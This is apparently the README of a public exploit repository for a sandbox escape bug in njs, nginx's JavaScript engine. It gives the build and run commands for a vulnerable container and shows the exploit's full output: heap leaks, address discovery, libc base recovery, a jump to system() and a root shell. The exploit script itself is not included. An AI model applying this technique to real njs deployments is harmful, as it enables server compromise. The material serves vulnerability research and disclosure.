# NJS Sandbox Escape Exploit 

This is the full exploit for _Bug #1_ from https://0xbigshaq.github.io/2024/05/24/njs-vr-bugs/

## Usage

Build the container to compile a vulnerable version of _njs_:

```sh
git clone git@github.com:0xbigshaq/njs-vr.git
cd njs-vr/
docker build -t njs-expdev .
```


Start the container & run `./njs/build/njs exp.js`:

```
$ docker run --rm -it njs-expdev
root@2b4030c83a7e:/exp-dev# ./njs/build/njs exp.js
[*] heap leak = 0x55a5c0833f90
[?] heap_ptr_raw_2 = 0x55a5c0842ad0
[?] heap_ptr_raw_3 = 0x55a5c08376f0
[*] long string length: 0xc0838a50
[*] offset: 455968
[?] addrof raw_buf = 0x55a5c08a3910
[*] Scanning the allocator's ptr tree
>starting at 0x55a5c0849970
 -> cur node 0x55a5c0859e00
 -> cur node 0x55a5c08a10e0
 -> cur node 0x55a5c08a9130
 -> cur node 0x55a5c089f470
 -> cur node 0x55a5c08af3d0
 -> cur node 0x55a5c08c0e88
 -> cur node 0x55a5c08c53e0
 -> cur node 0x7f06e4447718
 -> cur node 0x7f06e44dd720
 -> cur node 0x55a5c0833f90
 -> cur node 0x55a5c003ec70
 -> cur node 0x415541c320462c00
[+] njs_mp_rbtree_compare @ 0x55a5c003ec70
[*] njs base @ 0x55a5c0028000
[*] libc open @ 0x7f06e64e9f00
[*] libc base @ 0x7f06e63dc000
[*] njs_console @ 0x55a5c00fd6e0
[*] njs_console->engine @ 0x55a5c0831f00
[*] njs_console->engine->output @ 0x55a5c0831f40
[*] jumping to system(), go go go
# id
uid=0(root) gid=0(root) groups=0(root)
```